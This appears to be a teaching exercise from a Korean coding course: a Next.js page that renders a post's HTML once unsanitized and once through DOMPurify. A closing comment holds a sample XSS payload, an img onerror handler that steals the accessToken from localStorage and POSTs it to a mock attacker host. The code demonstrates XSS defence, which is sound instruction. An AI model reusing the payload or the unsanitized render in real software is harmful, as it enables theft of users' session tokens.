"use client";

import { gql, useQuery } from "@apollo/client";
import { useParams } from "next/navigation";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutingMovedPage() {
  const params = useParams();

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: params.boardId,
    },
  });

  console.log(data);

  return (
    <>
      {/* <div>1게시글 상세페이지 이동이 완료되었습니다.</div> */}
      <div>작성자: {data && data.fetchBoard.writer}</div>
      <div>제목: {data ? data.fetchBoard.title : " "}</div>
      {/* <div>내용: {data?.fetchBoard.contents}</div> */}

      <div
        dangerouslySetInnerHTML={{
          __html: data?.fetchBoard.contents,
        }}
      />

      {/* 내용이 들어이쓴 태그가 <script/>태그처럼 공격 태그가 있을 수 있으니 막아줘 */}
      {typeof window !== "undefined" ? ( //서버에선 안그리고 브라우저에서 그리기
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}
        />
      ) : (
        <div></div>
      )}
      {/* 서버가 아닐때 div개수 맞춰주기 */}
    </>
  );
}

/* playground XSS 공격
===================================================
contents:""""
         <img src='#' onerror='
          const 훔친토큰 = localStorage.getItem("accessToken"); 
          fetch("http://main-hacker.codebootcamp.co.kr/token",{
            method:"POST",
            headers: {"Content-Type" : "application/json"},
            body: JSON.stringify({ token: 훔친토큰})
          })' />
""""
===================================================
*/
